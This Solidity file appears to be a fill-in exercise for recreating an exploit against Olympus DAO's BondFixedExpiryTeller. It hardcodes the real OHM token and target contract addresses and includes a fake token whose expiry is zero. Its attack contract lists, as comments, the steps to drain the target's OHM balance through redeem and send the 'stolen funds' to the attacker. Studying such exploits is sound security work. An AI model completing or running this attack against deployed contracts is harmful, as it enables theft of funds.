//SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.9;

// ERC20 Interface
interface ERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}

// BondFixedExpiryTeller Interface
interface BondFixedExpiryTeller {
    function redeem(address token_, uint256 amount_) external payable;
    function setAuthority(address _newAuthority) external payable;
    function owner() external returns (address);
}

contract BadToken {
    function expiry() external pure returns (uint48 _expiry) {
        // Return a timestamp anytime before now
        return uint48(0x0);
    }

    function burn(address from, uint256 amount) external pure {}

    // Step 1: Add underlying() function to the token it must match whats expected on the
    // Olympus DAOs BondFixedExpiryTeller contract
}

// AttactContract Class
contract AttackContract {

    // Address of OHM Token
    ERC20 constant OHM = ERC20(0x64aa3364F17a4D01c6f1751Fd97C2BD3D7e7f1D5);

    // Address of Olympus DAOs BondFixedExpiryTeller contract
    BondFixedExpiryTeller constant targetContract = BondFixedExpiryTeller(0x007FE7c498A2Cf30971ad8f2cbC36bd14Ac51156);
    
    // Entry point for the attack, this will be called by an EOA using JavaScript
    function startAttack() external {

        // Step 2: Get OHM Token balance of the target contract

        // Step 3: Deploy our malicious token

        // Step 4: Start attack by calling the target contract's redeem function
        // - arg1: Address of malicious token
        // - arg2: Target contract's OHM Token balance

        // Step 5: Transfer stolen funds from this contract back to the EoA!
    }
}